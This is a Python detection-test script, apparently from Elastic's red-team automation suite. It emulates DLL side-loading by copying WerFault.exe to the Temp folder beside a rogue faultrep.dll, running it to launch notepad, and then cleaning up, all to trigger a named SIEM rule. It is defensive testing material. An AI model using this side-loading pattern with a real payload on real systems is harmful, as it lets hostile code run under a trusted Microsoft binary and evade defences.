# Copyright Elasticsearch B.V. and/or licensed to Elasticsearch B.V. under one
# or more contributor license agreements. Licensed under the Elastic License
# 2.0; you may not use this file except in compliance with the Elastic License
# 2.0.

from . import common
from . import RtaMetadata
import win32file, win32api, os, time
from os import path
from time import sleep


metadata = RtaMetadata(
    uuid="0de99f29-2219-4c88-8f56-d4119be5fad4",
    platforms=["windows"],
    endpoint=[],
    siem=[{"rule_id": "d84090d7-91e4-4063-84c1-c1f410dd717b", "rule_name": "DLL Side Loading via a Copied Microsoft Executable"}],
    techniques=["T1574"],
)

# faultrep.dll exporting WerpInitiateCrashReporting to start notepad.exe once invoked
FR_DLL = common.get_path("bin", "faultrep.dll")


@common.requires_os(metadata.platforms)
@common.dependencies(FR_DLL)
def main():
    # copy WerFault.exe to temp to sideload a rogue FaultRep.dll dependency
    win32file.CopyFile(path.expandvars("%systemroot%\\system32\\WerFault.exe"), path.expandvars("%localappdata%\\Temp\\RTA_WER.exe"), 0)
    win32file.CopyFile(FR_DLL, path.expandvars("%localappdata%\\Temp\\faultrep.dll"), 0)

    # start RTA_WER.exe to load FaultRep.dll
    if os.path.exists(path.expandvars("%localappdata%\\Temp\\RTA_WER.exe")) and os.path.exists(path.expandvars("%localappdata%\\Temp\\faultrep.dll")):
        print('[+] - WerFault.EXE copied to', path.expandvars("%localappdata%\\Temp\\RTA_WER.exe"))
        print('[+] - Fake Faultrep.dll copied to', path.expandvars("%localappdata%\\Temp\\faultrep.dll"))
        common.execute(["cmd.exe", "/c", path.expandvars("%localappdata%\\Temp\\RTA_WER.exe")])
        # Cleanup
        common.execute(["taskkill", "/f", "/im", "notepad.exe"])
        win32file.DeleteFile(path.expandvars("%localappdata%\\Temp\\RTA_WER.exe"))
        win32file.DeleteFile(path.expandvars("%localappdata%\\Temp\\faultrep.dll"))
        print('[+] - RTA_WER.exe and FaultRep.dll deleted.')
        print('[+] - RTA Done.')
    else:
        print('[+] - Failed to copy WerFault.exe and FaultRep.dll')

if __name__ == "__main__":
    exit(main())
